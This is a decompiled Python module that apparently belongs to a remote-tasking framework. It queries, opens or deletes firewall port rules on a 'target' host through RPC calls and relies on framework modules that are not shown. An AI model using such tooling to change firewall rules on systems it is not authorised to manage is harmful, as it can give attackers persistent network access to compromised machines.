# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Firewall_Tasking.py
CMD_ACTION_STATUS = 1
CMD_ACTION_ENABLE = 2
CMD_ACTION_DELETE = 3
CMD_PROTOCOL_TCP = 0
CMD_PROTOCOL_UDP = 1
CMD_DIRECTION_IN = 0
CMD_DIRECTION_OUT = 1

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.firewall', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.firewall.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.firewall.Params()
    tgtParams.provider = mcl.tasking.technique.Lookup('FIREWALL', mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, lpParams['method'])
    if lpParams['action'] == CMD_ACTION_STATUS:
        rpc = mca.network.cmd.firewall.tasking.RPC_INFO_QUERY
    elif lpParams['action'] == CMD_ACTION_ENABLE:
        if lpParams['portNum'] == 0:
            mcl.tasking.OutputError('Invalid port number')
            return False
        tgtParams.cleanup = not lpParams['permanent']
        tgtParams.portNum = lpParams['portNum']
        if lpParams['protocol'] == CMD_PROTOCOL_TCP:
            tgtParams.protocol = mca.network.cmd.firewall.FIREWALL_PROTOCOL_TCP
        elif lpParams['protocol'] == CMD_PROTOCOL_UDP:
            tgtParams.protocol = mca.network.cmd.firewall.FIREWALL_PROTOCOL_UDP
        else:
            mcl.tasking.OutputError('Invalid protocol')
            return False
        if lpParams['direction'] == CMD_DIRECTION_IN:
            tgtParams.direction = mca.network.cmd.firewall.PARAMS_DIRECTION_IN
        elif lpParams['direction'] == CMD_DIRECTION_OUT:
            tgtParams.direction = mca.network.cmd.firewall.PARAMS_DIRECTION_OUT
        else:
            mcl.tasking.OutputError('Invalid direction')
            return False
        if lpParams['name'] != None:
            tgtParams.name = lpParams['name']
        if lpParams['group'] != None:
            tgtParams.group = lpParams['group']
        rpc = mca.network.cmd.firewall.tasking.RPC_INFO_ENABLE
    elif lpParams['action'] == CMD_ACTION_DELETE:
        if lpParams['portNum'] == 0:
            mcl.tasking.OutputError('Invalid port number')
            return False
        tgtParams.portNum = lpParams['portNum']
        if lpParams['protocol'] == CMD_PROTOCOL_TCP:
            tgtParams.protocol = mca.network.cmd.firewall.FIREWALL_PROTOCOL_TCP
        elif lpParams['protocol'] == CMD_PROTOCOL_UDP:
            tgtParams.protocol = mca.network.cmd.firewall.FIREWALL_PROTOCOL_UDP
        else:
            mcl.tasking.OutputError('Invalid protocol')
            return False
        if lpParams['name'] != None:
            tgtParams.name = lpParams['name']
        rpc = mca.network.cmd.firewall.tasking.RPC_INFO_DELETE
    else:
        mcl.tasking.OutputError('Invalid action')
        return False
    taskXml = mcl.tasking.Tasking()
    taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, tgtParams.provider)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.firewall.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)